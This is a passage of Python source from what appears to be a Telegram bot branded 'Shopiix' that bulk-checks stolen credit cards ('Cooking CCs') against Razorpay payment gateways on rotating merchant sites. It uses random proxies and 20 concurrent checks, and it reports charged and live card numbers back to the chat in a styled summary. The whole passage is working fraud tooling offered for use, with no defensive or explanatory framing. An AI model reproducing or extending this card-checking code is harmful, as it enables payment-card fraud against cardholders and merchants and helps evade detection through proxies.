                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",                   b"noop")],
                [Button.inline("⛔  Stop", stop_key)],
            ]
            try:
                await bot.edit_message(
                    chat_id, prog_msg.id,
                    f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
                    buttons=buttons, parse_mode='html'
                )
            except Exception:
                pass

        semaphore     = asyncio.Semaphore(20)
        checked_count = [0]

        async def _check_one(card, idx):
            if _stop[0]:
                return
            async with semaphore:
                if _stop[0]:
                    return
                site  = random.choice(valid_sites)
                key   = _rz_key_cache[site]
                proxy = random.choice(proxies) if proxies else None
                res   = await razorpay_check(card, site, key, proxy_str=proxy)
                st    = res['status']
                msg   = res['message']
                if st == 'Charged':
                    results['charged'].append(res)
                elif st == 'Live':
                    results['live'].append(res)
                elif st == 'Error':
                    results['error'] += 1
                else:
                    results['dead'].append(res)
                checked_count[0] += 1
                if checked_count[0] % 5 == 0 or checked_count[0] == total:
                    await _update_prog(checked_count[0], card, msg)

        await asyncio.gather(*[_check_one(c, i + 1) for i, c in enumerate(cards)])
        bot.remove_event_handler(_stop_handler)

        elapsed  = int(time.time() - results['start'])
        h, rem   = divmod(elapsed, 3600)
        m_t, s_t = divmod(rem, 60)

        hits_txt = ''
        for r in results['charged'][:5]:
            hits_txt += f"💎 <code>{r['card']}</code>\n"
        for r in results['live'][:10]:
            hits_txt += f"🔥 <code>{r['card']}</code>\n"
        if not hits_txt:
            hits_txt = 'No hits found'

        summary = (
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"⚡  <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫  ·  𝗦𝗖𝗔𝗡  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ⚡\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗧𝗢𝗧𝗔𝗟</b>    ▸  <code>{total}</code>\n"
            f"💎 <b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>  ▸  <code>{len(results['charged'])}</code>\n"
            f"🔥 <b>𝗟𝗜𝗩𝗘</b>     ▸  <code>{len(results['live'])}</code>\n"
            f"❌ <b>𝗗𝗘𝗔𝗗</b>     ▸  <code>{len(results['dead'])}</code>\n"
            f"⚠️ <b>𝗘𝗥𝗥𝗢𝗥𝗦</b>   ▸  <code>{results['error']}</code>\n"
            f"🌐 <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬</b>  ▸  Razorpay Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>    ▸  {h}h {m_t}m {s_t}s\n\n"
            f"〔 🎯  H I T S 〕\n"
            f"<blockquote>{hits_txt}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
        )
        try:
            await bot.edit_message(chat_id, prog_msg.id, summary, parse_mode='html')
        except Exception:
            await event.respond(summary, parse_mode='html')
